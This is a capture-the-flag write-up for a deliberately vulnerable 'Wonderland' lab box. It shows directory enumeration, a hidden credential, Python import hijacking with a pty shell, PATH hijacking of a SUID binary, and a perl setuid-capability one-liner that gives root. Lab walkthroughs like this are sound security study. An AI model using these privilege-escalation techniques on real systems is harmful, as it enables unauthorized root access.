found directory 
```
http://10.10.85.105/r/
```

run gobuster again

```
http://10.10.85.105/r/a/
```

maybe the directories spell out rabbit?

found final page

```
http://10.10.85.105/r/a/b/b/i/t/
```

found this on page notes

```
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

found the user flag in the root directory
```
alice@wonderland:~$ cd /root
alice@wonderland:/root$ ls
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ cat user.txt
thm{"Curiouser and curiouser!"}
```
we will need this file to prev esc
```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

walrus_and_the_carpenter.py prints 10 random lines from the poem,

this is importing from random.py

https://leemendelowitz.github.io/blog/how-does-python-find-packages.html

python finds imports from the current directory first then from subsequent directories in sys.path

```
alice@wonderland:~$ python3
Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

create a file random.py in home directory to spawn shell

google - spawn shell

test with this

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

create random.py with the above code 

then run command 

```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
$ whoami
rabbit
```

SUID bit set on tea party
```
$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25 17:58 .
drwxr-xr-x 6 root   root    4096 May 25 17:52 ..
lrwxrwxrwx 1 root   root       9 May 25 17:53 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25 03:01 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25 03:01 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25 03:01 .profile
-rwsr-sr-x 1 root   root   16816 May 25 17:58 teaParty
```

if an executable has the setuid bit set on it, and it's owned by root, when launched by a normal user, it will run with root privileges

looks like the binary teaParty will be our priv esc vector


```
cat teaParty
```

it is a bit hard to read but we can see an interesting line

'Probably by ' && date --date='next hour'

it is calling a binary called date

create our fake date binary in the home directory

```
$ echo "/bin/bash" > date
```

try to run our binary
```
$ ./date
rabbit@wonderland:/home/rabbit$
```

yes it works and we have spawned a shell

now we want to trick the teaParty binary to call it so we can get root

we do this by changing the env $PATH variable so that it checks our home directory first for a binary

(we didn't have to do that for python earilier because python already checks the home directory by default)

```
rabbit@wonderland:/home/rabbit$ $PATH
bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: No such file or directory
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ $PATH
bash: /home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin: No such file or directory
```

run teaParty and we are now the user hatter

we find the password for hatter's ssh but nothing else in the home directory

```
hatter@wonderland:/home$ cd hatter
hatter@wonderland:/home/hatter$ ls
password.txt
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```

copy linpeas onto box

found this with linpeas.sh

```
[+] Capabilities
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                                                                              
/usr/bin/perl5.26.1 = cap_setuid+ep                                                                                                                                       
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

check gtfo bins - under perl/capabilities

```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
